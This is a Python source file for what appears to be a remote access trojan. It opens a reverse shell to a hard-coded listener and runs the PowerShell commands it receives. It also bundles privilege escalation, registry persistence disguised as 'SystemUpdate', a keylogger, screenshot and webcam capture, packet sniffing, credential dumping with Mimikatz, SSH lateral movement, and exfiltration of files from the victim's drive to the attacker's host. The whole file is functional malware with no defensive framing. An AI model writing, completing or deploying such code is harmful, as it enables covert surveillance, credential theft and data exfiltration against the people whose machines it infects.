import socket
import subprocess
import os
import time
import pyautogui
import cv2
from pynput.keyboard import Listener
from scapy.all import *
import paramiko

# Define your listener IP and port
# IP = "192.168.0.106"
IP = "10.0.2.18"
PORT = 52568

# Establish a socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

# Functions for additional capabilities
# -------------------------------------

# Privilege Escalation and Persistence
def escalate_privileges():
    # Attempt to re-run shell as admin
    subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)

def setup_persistence():
    # Get the absolute path of the current script
    script_path = os.path.abspath(__file__)
    
    # Registry persistence to run script on startup
    subprocess.run([
        "powershell", "-Command",
        f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' "
        f"-Value 'python {script_path}' -PropertyType String"
    ])

# Keylogger
def start_keylogger():
    def on_press(key):
        with open("C:\\Users\\Public\\keylogs.txt", "a") as log:
            log.write(str(key) + "\n")
    listener = Listener(on_press=on_press)
    listener.start()

# Screenshot Capture
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("C:\\Users\\Public\\screenshot.png")
    # Optionally add file transfer code to send to server

# File Exfiltration
def find_and_exfiltrate_files(extension):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    data = f.read()
                    s.send(data)  # Example of sending file content

# Webcam Access
def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("C:\\Users\\Public\\webcam.jpg", frame)
    cam.release()

# Network Sniffing
def sniff_network():
    def packet_callback(packet):
        if packet.haslayer(Raw):
            with open("C:\\Users\\Public\\network_log.txt", "a") as log:
                log.write(str(packet[Raw].load) + "\n")
    sniff(prn=packet_callback, store=0)

# Credential Dumping
def dump_credentials():
    subprocess.run(["powershell", "-Command", "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"], capture_output=True)

# Lateral Movement
def lateral_movement(target_ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target_ip, username=username, password=password)
    # Deploy your reverse shell or commands here

# Initialize privilege escalation, persistence, and keylogger at startup
escalate_privileges()
setup_persistence()
start_keylogger()

# Main reverse shell loop
while True:
    # Receive command from the listener
    command = s.recv(1024).decode("utf-8")

    if command.lower() == "exit":
        break
    elif command.lower() == "screenshot":
        capture_screenshot()
    elif command.lower() == "webcam":
        capture_webcam()
    elif command.lower().startswith("exfiltrate"):
        # Expecting format "exfiltrate .ext"
        _, extension = command.split()
        find_and_exfiltrate_files(extension)
    elif command.lower() == "sniff":
        sniff_network()
    elif command.lower() == "dumpcreds":
        dump_credentials()
    elif command.lower().startswith("move"):
        # Expecting format "move target_ip username password"
        _, target_ip, username, password = command.split()
        lateral_movement(target_ip, username, password)
    else:
        # Execute other PowerShell commands as before
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        s.send(result.stdout.encode("utf-8") + result.stderr.encode("utf-8"))

# Close the connection
s.close()
